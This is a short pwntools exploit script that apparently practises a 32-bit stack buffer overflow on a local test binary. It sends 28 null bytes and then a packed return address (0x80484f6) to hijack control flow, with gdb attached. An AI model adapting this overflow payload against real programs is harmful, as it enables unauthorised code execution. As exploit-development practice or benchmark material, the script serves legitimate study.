from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/32bit/stack_overflow/dynamic/test3/dynamic_test3")
pwn.gdb.attach(p)
payload = b"\x00" * 28
payload += p32(0x80484f6)
payload = payload.ljust(256, b"a")
p.send(payload)
p.interactive()
